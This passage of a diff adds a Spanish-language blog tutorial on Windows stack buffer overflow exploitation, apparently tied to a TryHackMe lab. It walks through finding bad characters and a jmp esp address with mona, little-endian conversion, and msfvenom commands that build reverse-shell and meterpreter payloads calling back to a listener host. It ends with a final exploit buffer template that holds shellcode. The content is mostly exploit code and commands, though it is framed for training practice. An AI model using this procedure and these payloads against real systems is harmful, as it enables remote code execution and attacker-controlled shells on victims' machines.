+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> badcharacters <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;C&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">600</span><span style="color:#f92672">-</span><span style="color:#ae81ff">112</span><span style="color:#f92672">-</span><span style="color:#ae81ff">4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">255</span>)
+</span></span></code></pre></div><p>Bloquea la aplicación usando este búfer y toma nota de la dirección a la que apunta ESP. Esto puede cambiar cada vez que bloquees la aplicación, así que acostúmbrate a copiarlo del registro cada vez.</p>
+<p>Utiliza el comando mona compare para hacer referencia al bytearray que generaste y a la dirección a la que apunta ESP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># comparar con el address</span>
+</span></span><span style="display:flex;"><span>!mona compare -f C:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\&lt;</span>appname&gt;<span style="color:#ae81ff">\b</span>ytearray.bin -a &lt;dirección&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># comparar referenciando al address con esp</span>
+</span></span><span style="display:flex;"><span>!mona compare -f C:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\&lt;</span>appname&gt;<span style="color:#ae81ff">\b</span>ytearray.bin -a ESP
+</span></span></code></pre></div><p><strong>REPETIR HASTA QUE HAYA ENCONTRADO TODOS LOS BADCHARACTERS, HACIENDOLO DE UNO EN UNO.</strong></p>
+<h2 id="encontrar-un-punto-de-salto">Encontrar un Punto de Salto</h2>
+<p>El comando mona jmp se puede usar para buscar instrucciones jmp (o equivalentes) a un registro específico. El comando jmp, por defecto, ignorará cualquier módulo marcado como aslr o rebase.</p>
+<p>El siguiente ejemplo busca &ldquo;jmp esp&rdquo; o equivalente (por ejemplo, call esp, push esp; retn, etc.) asegurándose de que la dirección de la instrucción no contenga los caracteres incorrectos \x00, \x0a y \x0d.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona jmp -r esp -cpb <span style="color:#e6db74">&#34;\x00\x0a\x0d&#34;</span>
+</span></span></code></pre></div><p>El comando mona find también se puede utilizar para encontrar instrucciones específicas, aunque en su mayor parte, el comando jmp es suficiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona find -s <span style="color:#e6db74">&#39;jmp esp&#39;</span> -type instr -cm aslr<span style="color:#f92672">=</span>false,rebase<span style="color:#f92672">=</span>false,nx<span style="color:#f92672">=</span>false -cpb <span style="color:#e6db74">&#34;\x00\x0a\x0d&#34;</span>
+</span></span></code></pre></div><p>Cuando se encuentr el punto de salto, hay que anotar cualquiera de las direcciones que genere el comando de mona. Las direcciones de memoria generalmente se almacenan en formato hexadecimal y en un formato específico de bytes en aplicaciones de explotación.</p>
+<p>Si la dirección que obtuviste de Mona está en formato hexadecimal, generalmente se necesita convertirla en el formato necesario para que la aplicación la ejecute correctamente. En este caso se hará con el formato <strong>Little Endian</strong>.</p>
+<p><strong>Little Endian:</strong> En este formato, el byte menos significativo (el byte más pequeño) se almacena en la dirección de memoria más baja, mientras que el byte más significativo (el byte más grande) se almacena en la dirección de memoria más alta. La mayoría de las arquitecturas x86 y x86-64 utilizan el formato little endian.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Supongamos que tenemos el número hexadecimal <span style="color:#ae81ff">0x12345678</span><span style="color:#f92672">.</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    Dirección de memoria más baja (menos significativa): <span style="color:#ae81ff">0x78</span>
+</span></span><span style="display:flex;"><span>    Dirección de memoria siguiente: <span style="color:#ae81ff">0x56</span>
+</span></span><span style="display:flex;"><span>    Dirección de memoria siguiente: <span style="color:#ae81ff">0x34</span>
+</span></span><span style="display:flex;"><span>    Dirección de memoria más alta (más significativa): <span style="color:#ae81ff">0x12</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Por lo que quedaría \x78\x56\x34\x12
+</span></span></code></pre></div><p>Se puede hacer a mano o usando el pequeño script de python siguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">2</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;[*] Run:</span><span style="color:#ae81ff">\n\t</span><span style="color:#e6db74">jump_address.py &lt;jump_point_address&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>address <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n1 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>n2 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">2</span>:<span style="color:#ae81ff">4</span>]
+</span></span><span style="display:flex;"><span>n3 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">4</span>:<span style="color:#ae81ff">6</span>]
+</span></span><span style="display:flex;"><span>n4 <span style="color:#f92672">=</span> address[<span style="color:#ae81ff">6</span>:<span style="color:#ae81ff">8</span>]
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">retn =  &#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n4 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n3 <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n2 <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> n1<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><h2 id="generar-payload">Generar Payload</h2>
+<p>Genera un payload de shell inverso usando msfvenom, asegurándote de excluir los mismos caracteres incorrectos que se encontraron anteriormente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Reverse shell basica</span>
+</span></span><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.92 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>thread -b <span style="color:#e6db74">&#34;\x00\x0a\x0d&#34;</span> -f c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Meterpreter</span>
+</span></span><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.56.1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>process -b <span style="color:#e6db74">&#34;\x00\x0a\x0d&#34;</span> -f c
+</span></span></code></pre></div><h2 id="agregar-nops">Agregar NOPs</h2>
+<p>Si se utilizó un codificador (lo más probable si hay caracteres incorrectos), recuerda agregar al menos 16 NOPs (\x90) al payload.</p>
+<h2 id="búfer-final">Búfer Final</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">112</span>
+</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x56\x23\x43\x9A</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xde\\</span><span style="color:#e6db74">xba</span><span style="color:#ae81ff">\x69\xd7\xe9\xa8\xd9\x74\x24\xf4\x58\x29\xc9\xb1</span><span style="color:#e6db74">...&#34;</span>
+</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
+</span></span></code></pre></div><h2 id="seguir-practicando-buffer-overflow">Seguir practicando Buffer Overflow</h2>
+<ul>
+<li><a href="https://github.com/justinsteven/dostackbufferoverflowgood">dostackbufferoverflowgood</a></li>
+<li><a href="https://github.com/stephenbradshaw/vulnserver">vulnserver</a></li>
+<li><a href="https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/">Práctica de Stack Buffer Overflow PWK/OSCP</a></li>
+</ul>
+<h2 id="-hack-the-planet">(◕‿‿◕) Hack the planet!</h2>
+</div>
+</article>
+
+    
+    <p class="articleTagsContainer">
+        <span> </span>
+        <strong>Tags:</strong>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/buffer-overflow">#Buffer Overflow</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/exploit-development">#Exploit Development</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/hard">#Hard</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/immunity-debugger">#Immunity Debugger</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/mona">#Mona</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/privilege-escalation">#Privilege Escalation</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/python">#Python</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/reverse-shell">#Reverse Shell</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/tryhackme">#TryHackMe</a>
+        
+            <a
+                
+                class="buttonTag"
+                
+                href="/tags/windows">#Windows</a>
+        
+    </p>
+
+
+
+
+
+
+                    </main><footer>
+    <hr />
+
+
+<p><small>
+        2023 &copy; Licensed under <a href="https://creativecommons.org/licenses/by-nc/4.0/">Creative Commons Attribution 4.0 International License</a>.
+    </small></p>
+    <p><small>
+        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
+    </small></p>
+</footer>
+</div>
+            </div>
+        </div>
+
+
+</body>
+</html>
